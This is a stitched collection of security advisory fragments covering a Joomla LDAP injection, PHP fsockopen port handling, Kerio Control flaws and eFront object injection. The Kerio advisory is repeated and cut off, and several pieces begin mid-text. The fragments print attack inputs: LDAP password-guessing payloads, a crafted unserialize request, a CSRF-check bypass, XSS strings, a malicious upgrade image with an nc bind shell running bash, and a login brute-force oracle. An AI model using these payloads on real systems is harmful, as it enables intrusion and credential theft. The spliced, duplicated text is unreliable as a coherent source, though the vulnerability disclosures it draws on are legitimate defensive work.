report](<https://demo.ripstech.com/projects/joomla_3.7.5>)\n\n### Proof Of Concept - Blind LDAP Injection\n\nThe lack of input sanitization of the username credential used in the LDAP query allows an adversary to modify the result set of the LDAP search. By using wildcard characters and by observing different authentication error messages, the attacker can literally search for the login credentials progressively by sending a row of payloads that guess the credentials character by character. `XXX;(&(uid=Admin)(userPassword=A*)) XXX;(&(uid=Admin)(userPassword=B*)) XXX;(&(uid=Admin)(userPassword=C*)) ... XXX;(&(uid=Admin)(userPassword=s*)) ... XXX;(&(uid=Admin)(userPassword=se*)) ... XXX;(&(uid=Admin)(userPassword=sec*)) ... XXX;(&(uid=Admin)(userPassword=secretPassword))`\n\nEach of these payloads yield exactly one out of two possible states which allow an adversary to abuse the server as an Oracle. A filter bypass is necessary for exploitation that is not covered in this blog post. With an optimized version of these payloads, one bit per request can be extracted from the LDAP server which results in a highly efficient blind LDAP injection attack.\n\n### Time Line\n\n  * 2017/07/27 Provided vulnerability details and PoC to vendor\n  * 2017/07/29 Vendor confirmed the security issue\n  * 2017/09/19 Vendor released fixed version\n\n### Summary\n\nAs one of the most popular open source CMS applications, Joomla! receives many code reviews from the security community. Yet alone one missed security vulnerability in the 500,000 lines of code can lead to a server compromise. With the help of [static code analysis](<https://www.ripstech.com/php-security-analysis/#static>), RIPS detected a critical LDAP injection vulnerability (CVE-2017-14596) that remained undiscovered for over 8 years. The vulnerability allows an attacker to steal login credentials from Joomla! installations that use LDAP authentication.\n\nWe would like to thank the Joomla! Security Strike Team for an excellent coordination and remediation of this issue and recommend to update to the latest Joomla! version 3.8 immediately.\n\n#### Video demo address:\n\nhttp://v.youku.com/v_show/id_XMzAzNjQxNjM4MA==.html\n",

Fast, flexible and pragmatic, PHP powers everything from  \nyour blog to the most popular websites in the world.\"  \n  \nSource: http://www.php.net/  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy making use of this issue, it is possible for an attacker to bypass current  \nprevention mechanisms used to protect the \"fsockopen\" function in PHP to perform  \nserver-side request forgery attacks.  \n  \nSEC Consult recommends to check the developed or installed websites for any  \npossibility to exploit any form of vulnerability due to this issue.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \nThe \"fsockopen\" function in PHP will respond differently if two port numbers  \nare given at once. As many developers assume the function will prioritize the  \nport number given to the second function parameter, an attacker may utilize this  \nunpredictable behavior to e.g. conduct a server-side request forgery attack.  \n  \n  \nProof of concept:  \n-----------------  \nThe \"fsockopen\" function in PHP will not use the port number given to the  \nsecond parameter if the hostname already has a port number appended. The  \nexample below should explain misbehavior of the function.  \n  \n// This request will go to port 80  \nfsockopen(\"192.168.184.132\", 80);  \n  \n// This request will go to port 53  \nfsockopen(\"192.168.184.132:53\", 80);  \n  \nInstead of initiating a socket connection on port 80 as given in the second  \nparameter, the function appears to use the port number 53 which is  \nappended to the hostname.  \n  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nPHP version 7.0.11 and 7.1.2 have been tested and found to be vulnerable.  \n  \nOlder PHP versions are potentially affected as well.  \n  \n  \nVendor contact timeline:  \n------------------------  \n2017-03-07: Reported the issue through PHP Bug Tracking System.

These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was intentionally written to just  \ntarget Kerio Control 9.1.0 Build 1087. This is because hardcoded offsets  \nare used which belong to the winroute binary with the SHA256 hash:  \n2808c35528b9a4713b91f65a881dfca03088de08b6331fdee1c698523bd757b0  \nThis exploit will not be released for now.  \n  \nA real-world-attacker can detect the remote binary version by bruteforcing  \nthe object handler related to CVE-2014-3515.  \n  \n  \n2) PHP script allows heap spraying  \nThe set.php script contains the following code:  \n$p_variable = urldecode($_POST['k_variable']);  \n$p_value = urldecode($_POST['k_value']);  \n...  \n$p_session->setSessionVariable($p_variable, $p_value);  \n  \nPOST requests with the following parameters can therefore be used to allocate  \nspace on the remote system:  \nk_securityHash=x&target=k_sessionVariable&k_variable=<random_name>  \n&k_value=<payload_to_allocate>  \n  \nDuring tests it was possible to spray approximately 400 MB data in 30 seconds  \nwhich is enough to control two predictable addresses on the heap.  \n  \n  \n3) CSRF Protection Bypass  \nTwo scripts are required for the remote code execution exploit:  \n-) set.php  \n-) ContentLoader.php  \nBoth scripts contain different very interesting CSRF check bypasses.  \n  \nThe following code can be found in set.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'] || $_POST['k_securityHash'];  \nif ('' == $p_postedHash || ($p_postedHash != $p_securityHash)) {  \nexit();  \n}  \n  \nSince the programming language is PHP (and not JavaScript), the above code code  \ndoes not work as expected. $p_postedHash can only become 0 or 1 because || is a  \nlogical operator. The if-condition compares the valid token with the posted one  \nvia the != operator, however, this will not check if types are the same.  \nIf k_securityHash is set (either via GET or POST) to any value, the above code  \nwill compare the number 1 with a string, which will always bypass the check.  \nIt's therefore enough to set k_securityHash to any value to bypass the CSRF  \nprotection.  \n  \nThe following code can be found in contentLoader.php:  \n$p_session->getCsrfToken(&$p_securityHash);  \n$p_postedHash = $_GET['k_securityHash'];  \n...  \nif (!$p_session || ('' == $p_postedHash && $p_postedHash != $p_securityHash)) {  \n$p_page = new p_Page();  \n$p_page->p_jsCode('window.top.location = \"index.php\";');  \n$p_page->p_showPageCode();  \ndie();  \n}  \n  \nNow the programmers only use the GET parameter, however, they changed the  \nlogical operator in the if condition from || to && which means that the CSRF  \ncheck will only be applied if $p_postedHash is empty. It's therefore again  \nenough to set k_securityHash to any value to bypass the check.  \n  \n  \n4) Webserver running with root privileges  \nNo proof of concept necessary.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nIn the following request the k_historyTimestamp parameter is prone to XSS:  \nhttps://<IP>:4081/contentLoader.php?k_dbName=x&k_securityHash=x  \n&k_historyTimestamp=aa%22;alert(1)%3b//  \n  \nIn the same request the id parameter can be used to inject JavaScript code.  \nNote that the attack can only be conducted against administrative users.  \nUsers with standard privileges can only access pages with k_dbName set to one  \nof the following values:  \n-) accStats  \n-) prefs  \n-) dialup  \n-) error  \n  \nIn such a case Kerio Control adds code like the following  \n(in this example k_dbName=dialup):  \nvar k_newDbName = \"<kerio:text id=\"tabCaption_dialup\"/>\";  \n  \nThe \" characters within the string are not correctly encoded.  \nThis will lead to the termination of the JavaScript execution. Because the  \ninjected payload is stored after this code, the attacker must bypass this  \ncode to ensure that the payload gets executed. This is only possible if  \nthe attacked user is an administrator because administrators can load any  \ndbName. By setting k_dbName to an invalid dbName (e.g. to 'x'), code like  \nthe following will be added instead (which does not crash):  \nvar k_newDbName = \"\";  \n  \nAnother XSS can be found at:  \nhttps://<IP>:4081/admin/internal/dologin.php?hash=%0D%0A\"><script>alert(1);</script><!--  \n  \n  \n6) Missing memory corruption protections  \nNo proof of concept necessary.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nThe following request returns information to the currently logged in user  \n(e.g. session token and username):  \n  \nGET /nonauth/getLoginType.js.php HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nThe following is a typical response:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 11:47:34 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginUnlock\";k_loginParams.k_nonauthToken =  \n\"0xb59066a8\";k_loginParams.k_sessionToken =  \n\"bc7c9ae78f01e498b7c935b4ad521b664d4e2c5574bde30cdf57851a58763660\";k_loginParams.k_loggedUser  \n= {k_asocName: \"user\", k_fullName: \"user\"};  \n  \nThe above response contains a valid pointer (0xb59066a8). In most cases this  \npointer will point to the heap. However, sometimes this pointer will point  \ninto a readable and writeable region behind a stack-region.  \nThe target location always stores the same data. During the analysis no  \nfurther effort was spent on analysing this behaviour.  \n  \nThe pointer will also be disclosed if the user is already logged out.  \nIn such a case the response looks like:  \n  \nHTTP/1.1 200 OK  \nConnection: Close  \nContent-type: text/html  \nDate: Tue, 24 Aug 2016 12:04:44 GMT  \nServer: Kerio Control Embedded Web Server  \nX-UA-Compatible: IE=edge  \n  \nk_loginParams.k_loginType = \"loginCommon\";k_loginParams.k_nonauthToken =  \n\"0xb2ee208\";  \n  \n  \nAn attack scenario can be:  \n-) The attacker tricks a victim to visit the attacker's malicious website  \n-) The attacker's website uses the CSRF bypass and the identified XSS  \nvulnerability to embed a malicious script inside the Kerio Control website  \n-) The attacker's website iframes the Kerio Control website to trigger the  \nexecution of the XSS payload  \n-) The XSS payload runs on the same domain and can therefore send requests  \nand read responses. This means the attacker can send requests to  \ngetLoginType.js.php to obtain a memory pointer.  \n-) If the memory pointer is within a specific range (e.g. the highest nibble  \nis zero), it's a pointer to the heap. In such a case the RCE vulnerability  \ncan be used to crash and restart the server. After that the same check can  \nbe done again.  \n-) If the memory pointer points near a stack (highest nibble is 0xb), the  \npointer can be used to calculate the base address of a stack.  \n-) Now the attacker knows the location of a stack (all stacks are marked as  \nreadable, writeable and executable). He can now easily bypass ASLR and DEP.  \n  \n  \n8) Remote Code Execution as administrator  \nAn attacker can create a malicious upgrade image with the following  \ncommands:  \ncat upgrade.sh  \n#!/bin/bash  \nnc -lp 9999 -e /bin/bash &  \n  \ntar czf upgrade.tar.gz *  \nmv upgrade.tar.gz upgrade.img  \n  \nThe image can be uploaded in the administrative web interface.  \nThis will bind a root shell on port 9999. The complete attack can also be  \nconducted via the cross site scripting vulnerability described in this  \nadvisory (XSS in contentLoader.php). This enables an attacker to conduct  \nthe attack from the Internet to obtain a reverse shell on Kerio Control.  \n  \n  \n9) Login not protected against brute-force attacks  \nValid credentials can be obtained via a brute-force attack.  \nIt's enough to send a POST request to /internal/dologin.php with the  \nparameters kerio_username and kerio_password set. A remote attacker  \ncan detect if the credentials are correct without reading the  \nresponse (SOP would not allow to read the response). This is possible  \nbecause /internal/photo will only return a valid image if the user is  \ncurrently logged in. The attacker can load an image from this URL and  \ncheck if loading was successful to leak the information if the  \ncredentials are valid or not.  \nThe following code demonstrates this:  \n<img src=\"https://<Kerio-IP>/internal/photo\" onerror=not_logged_in();  \nonload=logged_in();></img>  \n  \n  \nVulnerable / tested versions:  \n-----------------------------  \nThe following product versions were found to be vulnerable which were the  \nlatest versions available at the time of the discovery:  \nv9.1.0 (Build 1087)  \nv9.1.1 (Build 1324)  \n  \n  \nVendor contact timeline:  \n------------------------  \n2016-08-29: Contacting vendor through website  \n(bug report: bugreports@support.kerio.com) Ticket-ID: MYW-768664  \n2016-08-31: No answer, contacting CTO of Kerio via email  \n2016-09-01: Received security contact with PGP & S/MIME certificate  \n2016-09-01: Transmission of PGP encrypted advisory to Kerio  \n2016-09-09: Received answer, Kerio confirms vulnerabilities 1,2,3,5,6,7  \nStatement to vulnerability 9:  \n\"the feature already is in the product.\"  \nStatement to vulnerabilities 4 (Webserver running with root  \nprivileges) and 8 (Remote Code Execution as administrator):  \n\"I do not consider this a vulnerability\"  \nUpdate including a fix will be available on 2016-09-20  \n2016-09-09: SEC Consult informed Kerio to re-think the decision  \nnot fixing the vulnerabilities 4, 8 and 9  \nSEC Consult highly recommends to fix all reported issues  \n2016-09-13: SEC Consult informed Kerio that the advisory will be  \nreleased on 2016-09-22  \n2016-09-20: Kerio releases patch for Kerio Control  \n2016-09-22: Coordianted release of security advisory  \n  \n  \nSolution:  \n---------  \nThe vendor has released version 9.1.3 on 20th September which, according  \nto the vendor, fixes the vulnerabilities 1,2,3,5,6,7.  \n  \nThe vendor told us the following regarding vulnerability 9:  \n\"the feature already is in the product\"  \n  \nVulnerability 4 and 8 are not considered a vulnerability by the vendor  \nand will not be fixed.  \nSEC Consult strongly recommended fixing issue 4 and 8 as well.  \n  \nThe latest version can be downloaded from here:  \nhttp://www.kerio.com/support/kerio-control  \nhttp://www.kerio.com/support/kerio-control/release-history  \n  \n  \nWorkaround:  \n-----------  \nNone  \n  \n  \nAdvisory URL:  \n-------------  \nhttps://www.sec-consult.com/en/Vulnerability-Lab/Advisories.htm  \n  \n  \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  \n  \nSEC Consult Vulnerability Lab  \n  \nSEC Consult  \nBangkok - Berlin - Linz - Montreal - Moscow  \nSingapore - Vienna (HQ) - Vilnius - Zurich  \n  \nAbout SEC Consult Vulnerability Lab  \nThe SEC Consult Vulnerability Lab is an integrated part of SEC Consult.

From Wikipedia: \u201ceFront is designed to assist with the creation of online learning communities while offering various opportunities for collaboration and interaction through an icon-based user interface. The platform offers tools for content creation, tests building, assignments management, reporting, internal messaging, forum, chat, surveys, calendar and others\u201d.   \n  \n  \n[+] Vulnerability Details  \neFront 3.6.15 is prone to a PHP Object Injection vulnerability due to the unsafe use of unserialize() function. A potential attacker, authenticated as a Professor, could exploit this vulnerability by sending specially crafted requests to the web application containing malicious serialized input.  \n  \n  \n[+] Technical Details  \nA PHP Object Injection issue affects the copy.php script, which handles the copying of content between lessons, and others probably exist, due to the frequent use of deserialization operations on non-sanitized user input.   \n  \n[!] File: libraries/includes/copy.php  \n-----------------------------  \nif ($_GET['transfered']) {  \n$transferedNodesCheck = unserialize($_GET['transfered']);   \n}  \n$copiedTests = array();  \n$copiedUnits = array();  \n$map = array();  \nforeach ($nodeOrders as $value) {  \nlist($id, $parentContentId) = explode(\"-\", $value);  \nif (!in_array($id, $transferedNodesCheck)) {  \n-----------------------------  \n  \nThe injection affects the \"transfered\" parameter.  \n  \n  \n[+] Proof of Concept (PoC)  \n  \n  \n[!] HTTP Request  \n-----------------------------  \nGET /test/efront/www/professor.php?ctg=copy&from=8&node_orders=&transfered=[SERIALIZED_ARBITRARY_OBJECT]&mode&a jax=ajax&csrf_id=6ebb0b3aee60a1764e780e8494985a8e HTTP/1.1  \nHost: localhost  \nProxy-Connection: keep-alive  \nAccept: text/javascript, text/html, application/xml, text/xml, */*  \nX-Prototype-Version: 1.7  \nX-Requested-With: XMLHttpRequest  \nCookie: display_all_courses=1; setFormRowsHidden=0; PHPSESSID=6ebb0b3aee60a1764e780e8494985a8e; SQLiteManager_currentLangue=2; PHPSESSID=6ebb0b3aee60a1764e780e8494985a8e; professor_sidebar=hidden; professor_sidebarMode=automatic; parent_sid=6ebb0b3aee60a1764e780e8494985a8e  \n-----------------------------  \n  \nA common way to exploit this vulnerability is to find a PHP magic method that can be abused and inject a properly crafted arbitrary object in order to trigger it. Although a deeper analysis has not been performed, no useful PHP magic methods have been identified in order to exploit this specific vulnerability. Because the unmarshalled user input $transferedNodesCheck is exclusively used within an in_array() call, only __wakeup() and __destruct() methods could be abused to exploit the issue. However, none of those lends itself to the purpose. The vulnerability could still be abused in case of PHP vulnerable version (e.g., CVE-2014-8142) to create denial of service, leak memory and, under certain conditions, execute code.  \n  \n  \n[+] Disclaimer  \nPermission is hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given.

These comprehensive capabilities and unmatched  \ndeployment flexibility make Kerio Control the ideal choice for small  \nand mid-sized businesses.\"  \n  \nSource: http://www.kerio.com/products/kerio-control  \n  \n  \nBusiness recommendation:  \n------------------------  \nBy combining the vulnerabilities documented in this advisory an attacker  \ncan fully compromise a network which uses the Kerio Control appliance for  \nprotection.  \n  \nThe attacker can trick a victim to visit a malicious website which then conducts  \nthe internal attack. The attacked victim must be logged in or weak credentials  \nmust be configured which can be found with a bruteforce attack.  \n  \nThe attacker will gain a reverse root shell from the Internet to the internal  \nKerio Control firewall system. Moreover, it's possible that an internal attacker  \nuses the described vulnerabilities to escalate his privileges (low privileged  \naccount to full root shell) to steal credentials from other users on the UTM  \nappliance.  \n  \nMost vulnerabilities (RCE, CSRF bypasses, XSS, Heap Spraying) were found  \nin just two PHP scripts. Both scripts are not referenced by any other  \nPHP script nor by any binary on the system.  \nBoth scripts contain a different(!), seemingly deliberate(?) CSRF bypass  \nwhich make the vulnerabilities exploitable from the Internet to obtain a  \nreverse root shell.  \n  \nSEC Consult recommends not to use Kerio Control until a thorough security  \nreview has been performed by security professionals and all identified  \nissues have been resolved.  \n  \n  \nVulnerability overview/description:  \n-----------------------------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nAn authenticated user (standard user or administrator) can control data, which  \ngets later unserialized. Kerio Control uses PHP 5.2.13 which was released on  \n2010-02-25. This version is more than 6 years old and several bugs were found  \nin the meantime within the unserialize function. The following CVE numbers  \nare just some examples for vulnerabilities in unserialize which lead to remote  \ncode execution:  \n-) CVE-2014-8142  \n-) CVE-2014-3515  \n-) CVE-2015-0231  \n-) CVE-2015-6834  \n-) CVE-2016-5771  \n-) CVE-2016-5773  \n  \nPHP 5.2.13 is especially affected by CVE-2014-3515. This vulnerability uses a  \ntype confusion attack to trigger a use-after-free vulnerability. It can be used  \nto read data and get full code execution. In the case of Kerio Control the  \nresult of unserialize is not reflected back to the attacker. It's therefore not  \npossible to read memory from the stack or heap (e.g. to bypass ASLR).  \n  \nNevertheless, SEC Consult developed a fully working and reliable (blind) exploit  \nfor this vulnerability which spawns a reverse root shell to the Kerio Control  \nsystem.  \nFor this exploit a user account is required. However, it's also possible to  \nconduct the attack via the Internet because the CSRF (Cross Site Request  \nForgery) check can be bypassed (see below).  \n  \nAn attacker can use this vulnerability to break into a company network via the  \nInternet by tricking a logged in user to visit a malicious website. Even if the  \nuser is currently not logged in the attacker can start a bruteforce attack to  \nobtain valid credentials to conduct the attack.  \n  \n  \n2) PHP script allows heap spraying  \nOne of the PHP scripts allows the allocation of memory inside the main binary  \n(winroute) of Kerio Control. Winroute contains the code of most services  \n(e.g. the webserver, PHP, network related functionality, ...).  \nThe memory will not be freed after finishing the request and can therefore be  \nused to spray payloads to the whole memory space.  \n  \nThis vulnerability was used in the overall exploit to defeat ASLR.  \nPlease bear in mind that it's very likely that an attacker can write a working  \nexploit without heap spraying. Fixing this vulnerability would therefore not  \nprevent the exploitation of the remote code execution vulnerability.  \nFor example, the information disclosure vulnerability from this advisory can  \nbe used to bypass ASLR as well. This would eliminate the need of heap spraying.  \n  \n  \n3) CSRF Protection Bypass  \nThe PHP scripts contain code to protect against CSRF (Cross Site Request  \nForgery) attacks. Because of the wrong usage of PHP binary  \noperations and comparisons it's possible to bypass this check. That means  \nthat an attacker can trigger requests from other websites which will be handled  \nby Kerio Control. This vulnerability allows to exploit the remote code  \nexecution vulnerability from the Internet to break into a network.  \n  \n  \n4) Webserver running with root privileges  \nThe main binary (which contains the webserver and PHP) runs with root  \nprivileges.  \n  \nKerio told SEC Consult that this vulnerability will not be fixed. SEC  \nConsult strongly recommended otherwise.  \n  \n  \n5) Reflected Cross Site Scripting (XSS)  \nKerio Control does not properly encode parameters which are reflected on the  \nwebsite. This leads to cross site scripting vulnerabilities.  \nAn attacker can abuse these vulnerabilities to modify the website or do actions  \nin the context of the attacked user.  \n  \n  \n6) Missing memory corruption protections  \nThe main binary (winroute) is not compiled as position-independent executable  \n(PIE). This allowed the use of ROP (return-oriented-programming) code to  \nbypass the not executable heap. Moreover, the stack is per default marked as  \nexecutable, but the exact location of the stack is randomized by ASLR.  \n  \n  \n7) Information Disclosure leads to ASLR bypass  \nOne of the PHP scripts leaks pointers to the stack and heap.  \nThis can be abused by attackers to bypass ASLR.  \nBecause stacks are marked as executable an attacker can therefore easily bypass  \nASLR and DEP/NX.  \n  \n  \n8) Remote Code Execution as administrator  \nNearly a year ago on 2015-10-12 Raschin Tavakoli reported a remote code  \nexecution vulnerability in the administrative web interface in the upgrade  \nfunctionality. This vulnerability is still unfixed, only the associated XSS  \nvulnerability was fixed. However, an attacker can still exploit it from the  \nInternet, e.g. by abusing the XSS vulnerability described in this advisory  \n(where the CSRF check can be bypassed).  \n  \nWith this vulnerability an attacker can gain a reverse root shell on  \nKerio Control again if a logged in administrator visits a malicious website  \non the Internet.  \nMore information can also be found in the old advisory:  \nhttps://www.exploit-db.com/exploits/38450/  \n  \n  \n9) Login not protected against brute-force attacks  \nThere are no bruteforce protections in place for the login.  \nIf an unauthenticated victim visits an attacker's website, the attacker can  \nstart a bruteforce attack to obtain valid credentials to execute the  \nremote code execution exploit. Via image-loading the attacker can detect if  \nthe current credentials are valid (without violating SOP).  \n  \n  \nProof of concept:  \n-----------------  \n1) Unsafe usage of the PHP unserialize function and outdated PHP version leads  \nto remote-code-execution  \nThe following request can be used to set the unserialize data. In this example  \na faked string is used which points to 0xffffffff (kernel memory). Unserializing  \nit will therefore crash the remote webserver (the winroute process).  \n  \nPOST /set.php HTTP/1.1  \nHost: $IP:4081  \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \nContent-Type: application/x-www-form-urlencoded  \nContent-Length: 730  \n  \nk_securityHash=x&target=k_sessionVariable&k_variable=lastDisplayed&k_value=a:18:{s:8:\"k_dbName\";s:5:\"error\";s:11:\"k_dbSummara\";s:3:\"abc\";s:14:\"k_dbIndividual\";s:3:\"abc\";s:16:\"k_dbLastUsedType\";s:3:\"abc\";s:10:\"k_dbLayout\";s:3:\"abc\";s:10:\"k_pageType\";s:3:\"abc\";s:13:\"k_periodStart\";i:123;s:11:\"k_periodEnd\";i:123;s:8:\"k_userId\";i:123;s:6:\"tabBar\";i:123;s:13:\"k_gotoElement\";i:123;s:9:\"k_protoId\";i:123;s:11:\"k_errorType\";i:123;s:16:\"k_timezoneOffset\";i:123;s:9:\"k_groupId\";i:123;s:2:\"id\";i:123;s:11:\"k_dbSummary\";C:16:\"SplObjectStorage\":152:{x:i:2;O:8:\"stdClass\":1:{i:0;a:2:{i:1;i:1;i:2;i:2;}};d:2.0851592721051977e-262;;m:a:2:{i:0;S:15:\"\\ff\\ff\\ff\\ff\\20\\00\\00\\00\\01\\00\\00\\00\\06\\00\\00\";i:1;R:3;}}s:18:\"k_historyTimestamp\";s:3:\"abc\";}  \n  \nThe following request will call unserialize on the injected data:  \n  \nGET /contentLoader.php?k_getHistoryId=1&k_securityHash=x HTTP/1.1  \nHost: $IP:4081  \nCookie: SESSION_CONTROL_WEBIFACE=<valid session ID>;  \nConnection: close  \n  \nIn the example above only a denial of service will be conducted. However, an  \nattacker can change the data type to object to get full code execution on  \nthe remote system.  \n  \nSEC Consult developed a fully working exploit for this attack which spawns a  \nroot shell. Please note that this exploit was 